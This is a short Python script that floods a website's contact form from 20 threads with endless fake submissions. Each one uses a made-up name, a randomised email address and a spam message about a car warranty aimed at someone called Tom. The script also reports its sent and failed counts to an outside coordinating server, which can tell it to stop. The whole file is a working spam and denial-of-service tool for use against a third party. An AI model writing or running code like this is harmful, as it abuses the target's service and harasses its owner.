import requests
import random
import json
import threading
import signal
import os
import time

url = 'https://google.com'

names = json.loads(open('names.json').read())

threads = 20

sentTotal = 0
failedTotal = 0

sentPer = 0
failedPer = 0


def worker():
	global sentTotal
	global failedTotal

	global sentPer
	global failedPer
	
	while 1:
		name = names[random.randrange(0,len(names) - 1)]

		email = name.lower() + str(random.randrange(10,1000)) + '@npctom.com'

		req = requests.post(url, allow_redirects=False, data={

			'InputName': name,
			'InputEmail': email,
			'InputSubject': 'Hi Tom. I want a website',
			'InputMessage': 'we have been trying to reach u about ur cars entended wantery. From ' + email + '. pls contact me.'
		})

		if req.status_code == 200:
			sentTotal += 1
			sentPer += 1
		else:
			failedTotal += 1
			failedPer += 1

		# print('name: %s \t and email %s \t req= %s' % (name, email, req.status_code))
		print('req= %s\tsent= %i\tfailed= %i\tid= %s' % (req.status_code, sentTotal, failedTotal, str(threading.current_thread().name)))
		# print(req.text)


for i in range(threads):
    t = threading.Thread(target=worker)
    t.start()

while 1:
	api = requests.post('https://tom.dcralph.com', allow_redirects=False, data={'sent': sentPer, 'failed': failedPer})
	if api.json()['message'] == 'unite with tom!':
		print('stop now')
		os.kill(os.getpid(), signal.SIGSTOP)

	sentPer = 0
	failedPer = 0
	time.sleep(10)
